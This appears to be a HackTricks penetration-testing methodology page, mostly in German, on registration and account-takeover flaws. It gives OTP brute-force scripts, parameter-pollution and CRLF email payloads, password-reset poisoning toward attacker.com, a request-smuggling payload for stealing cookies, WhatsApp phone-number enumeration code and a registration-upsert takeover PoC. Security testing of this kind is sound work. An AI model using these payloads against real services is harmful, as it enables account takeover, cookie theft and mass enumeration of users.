# Registrierung & Takeover Vulnerabilities

{{#include ../banners/hacktricks-training.md}}

## Registrierung Takeover

### Duplizierte Registrierung

- Versuche, mit einem bereits vorhandenen username zu registrieren
- Überprüfe verschiedene Varianten der email:
- Großbuchstaben
- +1@
- Punkte in der E-Mail hinzufügen
- Sonderzeichen im E-Mail-Namen (%00, %09, %20)
- Leerzeichen nach der E-Mail setzen: `test@test.com a`
- victim@gmail.com@attacker.com
- victim@attacker.com@gmail.com
- Versuche Canonicalization-Tricks von E-Mail-Providern (dienstabhängig):
- Gmail ignoriert Punkte und Subaddressing: `victim+1@gmail.com`, `v.ic.tim@gmail.com` liefern an `victim@gmail.com`
- Einige Provider sind case-insensitive im local-part
- Einige Provider akzeptieren unicode confusables. Probiere Homoglyphs und soft hyphen `\u00AD` im local-part
- Missbrauche diese, um: Uniqueness-Checks zu umgehen, duplicate Accounts/workspace-invites zu erhalten oder Victim-Sign‑ups zu blockieren (temporärer DoS), während du eine takeover vorbereitest

### Username Enumeration

Prüfe, ob du herausfinden kannst, wann ein username bereits innerhalb der Anwendung registriert ist.

- Unterschiedliche Fehlermeldungen oder HTTP-Statuscodes
- Timing-Unterschiede (existierender Benutzer kann Lookup zum IdP/DB auslösen)
- Autofill des Registrierungsformulars mit Profildaten für bekannte E-Mails
- Prüfe Team-/Invite-Flows: Die Eingabe einer E-Mail kann offenbaren, ob ein Account existiert

### Passwort-Richtlinie

Beim Erstellen eines Benutzers die Passwort-Richtlinie prüfen (ob schwache Passwörter erlaubt sind).\
In diesem Fall kannst du versuchen, Credentials zu bruteforcen.

### SQL Injection

[**Check this page** ](sql-injection/index.html#insert-statement)um zu lernen, wie man Account-Takeovers versucht oder Informationen via **SQL Injections** in Registrierungsformularen extrahiert.

### Oauth Takeovers


{{#ref}}
oauth-to-account-takeover.md
{{#endref}}

### SAML Vulnerabilities


{{#ref}}
saml-attacks/
{{#endref}}

### E-Mail ändern

Wenn registriert, versuche die E-Mail zu ändern und prüfe, ob diese Änderung korrekt validiert wird oder ob sie auf beliebige E-Mails gesetzt werden kann.

### Weitere Checks

- Prüfe, ob du **disposable emails** (mailinator, yopmail, 1secmail, etc.) verwenden kannst oder die Blocklist mit Subaddressing wie `victim+mailinator@gmail.com` umgehst
- **Langes** **password** (>200) führt zu **DoS**
- **Prüfe Rate Limits bei Account-Erstellung**
- Verwende username@**burp_collab**.net und analysiere den **callback**
- Wenn Telefonverifizierung genutzt wird, prüfe Phone-Parsing-/Injection-Edge-Cases

{{#ref}}
phone-number-injections.md
{{#endref}}

{{#ref}}
captcha-bypass.md
{{#endref}}

### Contact-discovery / identifier-enumeration oracles

Phone-number–zentrierte Messenger exponieren ein **presence oracle**, wann immer der Client Kontakte synced. Das Replaying von WhatsApps Discovery-Requests lieferte historisch **>100M lookups per hour**, was nahezu komplette Account-Enumerierungen ermöglichte.

Angriffsablauf

1. **Instrumentiere einen offiziellen Client**, um die Address-Book-Upload-Request zu erfassen (authentifizierter Blob normalisierter E.164-Nummern). Replay ihn mit Angreifer-generierten Nummern und reuse dabei die gleichen cookies/device token.
2. **Batch-Nummern pro Request**: WhatsApp akzeptiert Tausende von Identifikatoren und gibt registered/unregistered plus Metadata (business, companion, etc.) zurück. Analysiere die Responses offline, um Target-Listen zu bauen, ohne Victims zu kontaktieren.
3. **Horizontales Skalieren** der Enumeration mit SIM-Banken, cloud-Geräten oder residential proxies, sodass per-account/IP/ASN Throttling nie ausgelöst wird.

Modellierung des Wahlplans

Modelle den Wahlplan jedes Landes, um ungültige Kandidaten zu überspringen. Das NDSS-Dataset (`country-table.*`) listet Ländercodes, Adoption-Dichte und Platform-Split, sodass du hoch-treffende Bereiche priorisieren kannst. Beispiel-Seeding-Code:
```python
import pandas as pd
from itertools import product

df = pd.read_csv("country-table.csv")
row = df[df["Country"] == "India"].iloc[0]
prefix = "+91"  # India mobile numbers are 10 digits
for suffix in product("0123456789", repeat=10):
candidate = prefix + "".join(suffix)
enqueue(candidate)
```
Priorisiere Präfixe, die mit realen Zuweisungen übereinstimmen (Mobile Country Code + National Destination Code), bevor du das oracle abfragst, um den Durchsatz nützlich zu halten.

**Turning enumerations into targeted attacks**

- Füttere leaked phone numbers (z. B. Facebook’s 2021 breach) in das oracle, um herauszufinden, welche Identitäten vor phishing, SIM-swapping oder spamming noch aktiv sind.
- Zerschneide Datensätze nach Land/OS/App-Typ, um Regionen mit schwacher SMS-Filterung oder hoher WhatsApp Business-Nutzung für lokales social engineering zu finden.

**Public-key reuse correlation**

WhatsApp offenbart während des Session-Setups den X25519 identity key jedes Kontos. Fordere identity material für jede enumerierte Nummer an und dedupliziere die public keys, um account farms, geklonte Clients oder unsichere Firmware aufzudecken — gemeinsame Keys deanonymisieren multi-SIM-Operationen.

## Weak Email/Phone Verification (OTP/Magic Link)

Registration flows verifizieren Besitz oft über einen numerischen OTP oder einen magic-link token. Typische Fehler:

- Guessable oder zu kurzer OTP (4–6 digits) ohne effektives Rate Limiting oder IP/Device-Tracking. Versuche parallele Fehlversuche und Header/IP-Rotation.
- OTP-Wiederverwendung über Aktionen oder Accounts hinweg, oder nicht an den spezifischen Nutzer/Aktion gebunden (z. B. derselbe Code funktioniert für login und signup, oder funktioniert nach Änderung der Email).
- Multi-value smuggling: einige Backends akzeptieren mehrere Codes und prüfen, ob einer passt. Versuche:
- `code=000000&code=123456`
- JSON arrays: `{"code":["000000","123456"]}`
- Mixed parameter names: `otp=000000&one_time_code=123456`
- Komma-/Pipe-separierte Werte: `code=000000,123456` oder `code=000000|123456`
- Response oracle: unterscheide wrong vs expired vs wrong-user Codes anhand von Status/Message/Body-Länge.
- Tokens werden nach Erfolg oder nach Passwort/Email-Änderung nicht invalidiert.
- Verification token ist nicht an User-Agent/IP gebunden, erlaubt so eine Cross-Origin-Abwicklung von attacker-controlled pages.

Bruteforcing example with ffuf against a JSON OTP endpoint:
```bash
ffuf -w <wordlist_of_codes> -u https://target.tld/api/verify -X POST \
-H 'Content-Type: application/json' \
-d '{"email":"victim@example.com","code":"FUZZ"}' \
-fr 'Invalid|Too many attempts' -mc all
```
Paralleles/gleichzeitiges Raten, um sequentielle Sperren zu umgehen (verwende Turbo Intruder in Burp):

<details>
<summary>Turbo Intruder snippet, um 6‑stellige OTP‑Versuche zu fluten</summary>
```python
def queueRequests(target, wordlists):
engine = RequestEngine(endpoint=target.endpoint, concurrentConnections=30, requestsPerConnection=100)
for code in range(0,1000000):
body = '{"email":"victim@example.com","code":"%06d"}' % code
engine.queue(target.req, body=body)


def handleResponse(req, interesting):
if req.status != 401 and b'Invalid' not in req.response:
table.add(req)
```
</details>

- Try racing verification: sende denselben gültigen OTP gleichzeitig in zwei Sessions; manchmal wird eine Session zum verifizierten Angreiferkonto, während der Opfer‑Flow ebenfalls erfolgreich ist.
- Teste auch Host header poisoning an verification links (wie beim reset poisoning weiter unten), um auf einem attacker‑controlled Host zu leaken oder die Verifizierung abzuschließen.

{{#ref}}
rate-limit-bypass.md
{{#endref}}

{{#ref}}
2fa-bypass.md
{{#endref}}

{{#ref}}
email-injections.md
{{#endref}}

## Account Pre‑Hijacking Techniques (before the victim signs up)

Eine mächtige Klasse von Problemen entsteht, wenn ein Angreifer Aktionen auf der E‑Mail des Opfers durchführt, bevor das Opfer sein Konto erstellt, und später wieder Zugang erlangt.

Wichtige Techniken zum Testen (an die Ziel‑Flows anpassen):

- Classic–Federated Merge
- Attacker: registriert ein classic Konto mit der E‑Mail des Opfers und setzt ein Passwort
- Victim: meldet sich später per SSO mit derselben E‑Mail an
- Unsichere Merges können beide Parteien eingeloggt lassen oder den Zugriff des Angreifers wiederherstellen
- Unexpired Session Identifier
- Attacker: erstellt Konto und hält eine long‑lived session (nicht ausloggen)
- Victim: recovert/setzt Passwort und nutzt das Konto
- Prüfe, ob alte Sessions nach reset oder MFA‑Aktivierung weiterhin gültig bleiben
- Trojan Identifier
- Attacker: fügt dem vorerstellten Konto einen sekundären Identifier hinzu (Telefon, zusätzliche E‑Mail oder verknüpft Angreifers IdP)
- Victim: setzt das Passwort zurück; Angreifer nutzt später den trojan identifier zum Reset/Login
- Unexpired Email Change
- Attacker: initiiert email‑change zur attacker‑Mail und hält die Bestätigung zurück
- Victim: recovert das Konto und beginnt es zu nutzen
- Attacker: schließt später die ausstehende email‑change ab, um das Konto zu stehlen
- Non‑Verifying IdP
- Attacker: nutzt einen IdP, der keinen E‑Mail‑Besitz verifiziert, um `victim@…` zu behaupten
- Victim: registriert sich über die classic Route
- Service merged anhand der E‑Mail ohne Prüfung von `email_verified` oder ohne lokale Verifizierung

Praktische Hinweise

- Harveste Flows und Endpoints aus Web/Mobile Bundles. Suche nach classic signup, SSO linking, email/phone change und password reset Endpoints.
- Erstelle realistische Automation, um Sessions am Leben zu halten, während du andere Flows testest.
- Für SSO‑Tests stelle einen Test OIDC provider bereit und issue Tokens mit `email` Claims für die Opfer‑Adresse und `email_verified=false`, um zu prüfen, ob das RP unverified IdPs vertraut.
- Nach jedem password reset oder email change verifiziere, dass:
  - alle anderen Sessions und Tokens invalidiert sind,
  - ausstehende email/phone change Möglichkeiten storniert sind,
  - zuvor verknüpfte IdPs/emails/phones erneut verifiziert werden.

Hinweis: Umfangreiche Methodologie und Fallstudien zu diesen Techniken sind in Microsofts pre‑hijacking Forschung dokumentiert (siehe References am Ende).

{{#ref}}
reset-password.md
{{#endref}}

{{#ref}}
race-condition.md
{{#endref}}

## **Password Reset Takeover**

### Password Reset Token Leak Via Referrer <a href="#password-reset-token-leak-via-referrer" id="password-reset-token-leak-via-referrer"></a>

1. Request password reset to your email address
2. Click on the password reset link
3. Don’t change password
4. Click any 3rd party websites(eg: Facebook, twitter)
5. Intercept the request in Burp Suite proxy
6. Check if the referer header is leaking password reset token.

### Password Reset Poisoning <a href="#account-takeover-through-password-reset-poisoning" id="account-takeover-through-password-reset-poisoning"></a>

1. Intercept the password reset request in Burp Suite
2. Add or edit the following headers in Burp Suite : `Host: attacker.com`, `X-Forwarded-Host: attacker.com`
3. Forward the request with the modified header\
`http POST https://example.com/reset.php HTTP/1.1 Accept: */* Content-Type: application/json Host: attacker.com`
4. Look for a password reset URL based on the _host header_ like : `https://attacker.com/reset-password.php?token=TOKEN`

### Password Reset Via Email Parameter <a href="#password-reset-via-email-parameter" id="password-reset-via-email-parameter"></a>
```bash
# parameter pollution
email=victim@mail.com&email=hacker@mail.com

# array of emails
{"email":["victim@mail.com","hacker@mail.com"]}

# carbon copy
email=victim@mail.com%0A%0Dcc:hacker@mail.com
email=victim@mail.com%0A%0Dbcc:hacker@mail.com

# separator
email=victim@mail.com,hacker@mail.com
email=victim@mail.com%20hacker@mail.com
email=victim@mail.com|hacker@mail.com
```
### IDOR on API Parameters <a href="#idor-on-api-parameters" id="idor-on-api-parameters"></a>

1. Angreifer müssen sich mit ihrem Konto einloggen und zur Funktion **Passwort ändern** gehen.
2. Starte Burp Suite und fange die Anfrage ab
3. Sende sie an den repeater-Tab und bearbeite die Parameter : User ID/email\
`powershell POST /api/changepass [...] ("form": {"email":"victim@email.com","password":"securepwd"})`

### Schwaches Passwort-Reset-Token <a href="#weak-password-reset-token" id="weak-password-reset-token"></a>

Der Passwort-Reset-Token sollte zufällig generiert und jedes Mal eindeutig sein.\
Versuche zu bestimmen, ob der Token abläuft oder immer derselbe ist; in manchen Fällen ist der Erzeugungsalgorithmus schwach und kann erraten werden. Folgende Variablen könnten vom Algorithmus verwendet werden.

- Zeitstempel
- UserID
- E-Mail des Benutzers
- Vorname und Nachname
- Geburtsdatum
- Kryptographie
- Nur Zahlen
- Kurze Token-Sequenz ( Zeichen zwischen \[A-Z,a-z,0-9])
- Wiederverwendung des Tokens
- Ablaufdatum des Tokens

### Leaking Passwort-Reset-Token <a href="#leaking-password-reset-token" id="leaking-password-reset-token"></a>

1. Löse eine Passwort-Reset-Anfrage über die API/UI für eine bestimmte E-Mail aus, z. B.: test@mail.com
2. Untersuche die Serverantwort und prüfe auf `resetToken`
3. Dann benutze den Token in einer URL wie `https://example.com/v3/user/password/reset?resetToken=[THE_RESET_TOKEN]&email=[THE_MAIL]`

### Passwort-Reset via Benutzername-Kollision <a href="#password-reset-via-username-collision" id="password-reset-via-username-collision"></a>

1. Registriere dich im System mit einem Benutzernamen, der identisch zum Benutzernamen des Opfers ist, aber mit Leerzeichen vor und/oder nach dem Benutzernamen eingefügt, z. B.: `"admin "`
2. Fordere ein Passwort-Reset für deinen bösartigen Benutzernamen an.
3. Verwende den an deine E-Mail gesendeten Token und setze das Passwort des Opfers zurück.
4. Melde dich mit dem neuen Passwort am Konto des Opfers an.

Die Plattform CTFd war für diesen Angriff verwundbar.\
See: [CVE-2020-7245](https://nvd.nist.gov/vuln/detail/CVE-2020-7245)

### Account-Übernahme via Cross Site Scripting <a href="#account-takeover-via-cross-site-scripting" id="account-takeover-via-cross-site-scripting"></a>

1. Finde ein XSS in der Anwendung oder einer Subdomain, falls die Cookies für die Parent-Domain gesetzt sind: `*.domain.com`
2. Leak das aktuelle **Sessions-Cookie**
3. Authentifiziere dich als der Nutzer mithilfe des Cookies

### Account-Übernahme via HTTP Request Smuggling <a href="#account-takeover-via-http-request-smuggling" id="account-takeover-via-http-request-smuggling"></a>

1. Benutze **smuggler** um den Typ des HTTP Request Smuggling zu erkennen (CL, TE, CL.TE)\
`powershell git clone https://github.com/defparam/smuggler.git cd smuggler python3 smuggler.py -h`\
2. Erzeuge eine Anfrage, die `POST / HTTP/1.1` mit den folgenden Daten überschreibt:\
`GET http://something.burpcollaborator.net HTTP/1.1 X:` mit dem Ziel, die Opfer per open redirect zu burpcollab zu leiten und ihre Cookies zu stehlen\
3. Die finale Anfrage könnte wie folgt aussehen
```
GET / HTTP/1.1
Transfer-Encoding: chunked
Host: something.com
User-Agent: Smuggler/v1.0
Content-Length: 83
0

GET http://something.burpcollaborator.net  HTTP/1.1
X: X
```
Hackerone-Berichte zur Ausnutzung dieses Bugs\
* [https://hackerone.com/reports/737140](https://hackerone.com/reports/737140)\
* [https://hackerone.com/reports/771666](https://hackerone.com/reports/771666)

### Kontoübernahme via CSRF <a href="#account-takeover-via-csrf" id="account-takeover-via-csrf"></a>

1. Erstelle eine Payload für CSRF, z. B.: “HTML form with auto submit for a password change”
2. Sende die Payload

### Kontoübernahme via JWT <a href="#account-takeover-via-jwt" id="account-takeover-via-jwt"></a>

JSON Web Token können verwendet werden, um einen Benutzer zu authentifizieren.

- JWT mit einer anderen User ID / E-Mail bearbeiten
- Auf schwache JWT-Signatur prüfen


{{#ref}}
hacking-jwt-json-web-tokens.md
{{#endref}}

## Registration-as-Reset (Upsert on Existing Email)

Einige Signup-Handler führen ein upsert durch, wenn die angegebene E-Mail bereits existiert. Akzeptiert der Endpoint einen minimalen Body mit einer E-Mail und einem Passwort und erzwingt keine Besitzverifikation, wird durch Senden der E-Mail des Opfers deren Passwort bereits vor der Authentifizierung überschrieben.

- Discovery: Endpunktnamen aus gebündeltem JS (oder Mobile-App-Traffic) sammeln, dann Basis-Pfade wie /parents/application/v4/admin/FUZZ mit ffuf/dirsearch fuzz'en.
- Method hints: Ein GET, das Nachrichten wie "Only POST request is allowed." zurückgibt, deutet oft auf das korrekte Verb hin und darauf, dass ein JSON-Body erwartet wird.
- Minimaler Body in der Praxis beobachtet:
```json
{"email":"victim@example.com","password":"New@12345"}
```
Beispiel PoC:
```http
POST /parents/application/v4/admin/doRegistrationEntries HTTP/1.1
Host: www.target.tld
Content-Type: application/json

{"email":"victim@example.com","password":"New@12345"}
```
Auswirkung: Vollständige Account-Übernahme (ATO) ohne Reset-Token, OTP oder E-Mail-Verifizierung.

## Referenzen

- [How I Found a Critical Password Reset Bug (Registration upsert ATO)](https://s41n1k.medium.com/how-i-found-a-critical-password-reset-bug-in-the-bb-program-and-got-4-000-a22fffe285e1)
- [Microsoft MSRC – Pre‑hijacking attacks on web user accounts (May 2022)](https://msrc.microsoft.com/blog/2022/05/pre-hijacking-attacks/)
- [https://salmonsec.com/cheatsheet/account_takeover](https://salmonsec.com/cheatsheet/account_takeover)
- [Hey there! You are using WhatsApp: Enumerating Three Billion Accounts for Security and Privacy (NDSS 2026 paper & dataset)](https://github.com/sbaresearch/whatsapp-census)

{{#include ../banners/hacktricks-training.md}}
